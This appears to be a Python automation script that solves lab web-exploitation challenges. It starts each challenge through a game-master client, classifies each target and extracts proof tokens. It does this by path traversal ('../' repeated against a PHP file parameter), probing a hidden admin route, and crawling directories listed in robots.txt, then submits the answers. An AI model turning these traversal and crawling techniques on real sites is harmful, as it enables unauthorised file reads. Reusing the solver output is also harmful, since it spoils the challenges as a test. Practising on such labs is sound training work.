import sys, time, re, requests
sys.path.insert(0, "~/ctf")
from gm import GM
UA={"User-Agent":"ctf-recon"}
PROOF=re.compile(r"proof_[0-9a-fA-F]{16,}")
g=GM()
def G(s,u,**k):
    k.setdefault("timeout",12)
    try: return s.get(u,**k)
    except Exception: return None
def wait_ready(url, limit=120):
    url=url.rstrip("/"); t0=time.time()
    while time.time()-t0<limit:
        s=requests.Session(); s.headers.update(UA)
        r=G(s,url+"/",timeout=8)
        if r is not None and r.status_code==200 and "<" in r.text and "expired" not in r.text:
            return s, r.text
        time.sleep(3)
    return None, None
def detect(home):
    h=home.lower()
    if "/lookup" in h or ("<form" in h and "search" in h): return "sqli"
    if "/api/clues" in h or "feature_route" in h or "feature route" in h: return "admin"
    if re.search(r"\.php\?[a-z0-9_]+=", h) or "reader.php" in h or "notes.php" in h: return "lfi"
    if "signed in as" in h or "/api/history" in h or "/api/events" in h or "activity feed" in h: return "idor"
    return "backup"
def solve_admin(url):
    url=url.rstrip("/"); s=requests.Session(); s.headers.update(UA)
    fr=None
    r=G(s,url+"/api/clues")
    if r is not None:
        try: fr=r.json().get("feature_route")
        except Exception: pass
    cands=[fr] if fr else []
    for p in cands:
        if not p: continue
        if not p.startswith("/"): p="/"+p
        for meth in ("get","post"):
            rr=getattr(s,meth)(url+p, timeout=12) if False else (G(s,url+p) if meth=="get" else s.post(url+p,timeout=12))
            if rr is not None:
                m=PROOF.search(rr.text)
                if m: return m.group(0)
    return None
def solve_lfi(url):
    url=url.rstrip("/"); s=requests.Session(); s.headers.update(UA)
    r=G(s,url+"/"); home=r.text if r else ""
    m=re.search(r"([A-Za-z0-9_]+\.php)\?([A-Za-z0-9_]+)=", home)
    ep="/"+(m.group(1) if m else "reader.php"); pm=m.group(2) if m else "doc"
    for depth in (8,10,12,6,16):
        rr=G(s,url+ep+"?"+pm+"="+("../"*depth)+"run/huntress/objective.txt")
        if rr is not None:
            mm=PROOF.search(rr.text)
            if mm: return mm.group(0)
    return None
def solve_backup(url):
    url=url.rstrip("/"); s=requests.Session(); s.headers.update(UA)
    rb=G(s,url+"/robots.txt"); dirs=[]
    if rb is not None:
        dirs=[m.group(1) for m in re.finditer(r"(?im)^\s*Disallow:\s*(\S+)", rb.text)]
    for d in dirs+["/"]:
        if not d.startswith("/"): d="/"+d
        idx=G(s,url+d)
        if idx is None: continue
        m=PROOF.search(idx.text)
        if m: return m.group(0)
        for href in re.findall(r"href=[\"\x27]([^\"\x27]+)[\"\x27]", idx.text):
            if href.startswith(("http","//","#")) or "/assets/" in href: continue
            u=href if href.startswith("/") else d.rstrip("/")+"/"+href
            rr=G(s,url+u)
            if rr is not None:
                m2=PROOF.search(rr.text)
                if m2: return m2.group(0)
    return None
SOLVERS={"admin":solve_admin,"lfi":solve_lfi,"backup":solve_backup}
def solve_target(url):
    s,home=wait_ready(url)
    if not s: return None
    kind=detect(home)
    fn=SOLVERS.get(kind, solve_backup)
    pf=fn(url)
    if not pf:  # try the rest as fallback
        for k,f in SOLVERS.items():
            if f is fn: continue
            pf=f(url)
            if pf: break
    print("    (%s) %s" % (kind, pf))
    return pf
def run(ch, run_for_time=None):
    body={"op":"start","challenge":ch}
    if run_for_time is not None: body["run_for_time"]=run_for_time
    r=g.post(body)
    if r.get("error"): r=g.post({"op":"start","challenge":ch})
    w=0
    while not r.get("targets") and w<75:
        time.sleep(5); w+=5; r=g.status(ch)
    tgs=r.get("targets",[]); qs=r.get("questions",[])
    if not tgs: print("  [%s] NO TARGET %s" % (ch, r.get("error"))); return False
    tmap={t["id"]:t["url"] for t in tgs}
    ans={}
    for q in qs:
        url=tmap.get(q.get("artifact")) or list(tmap.values())[0]
        print("  [%s] %s %s" % (ch, q["id"], url[:50]))
        pf=solve_target(url)
        if pf: ans[q["id"]]=pf
    if ans and len(ans)==len(qs):
        res=g.submit(ch, ans)
        print("  [%s] SUBMIT %s flag=%s" % (ch, res.get("result"), res.get("flag")))
        return res.get("result") in ("CORRECT","accepted")
    print("  [%s] incomplete %d/%d" % (ch, len(ans), len(qs))); return False
base="web-exploitation-day-05-administratively-speaking"
print("== single =="); run(base, None)
print("== time_trial =="); run(base+"/time_trial", False)
print("== mastery =="); run(base+"/mastery", False)
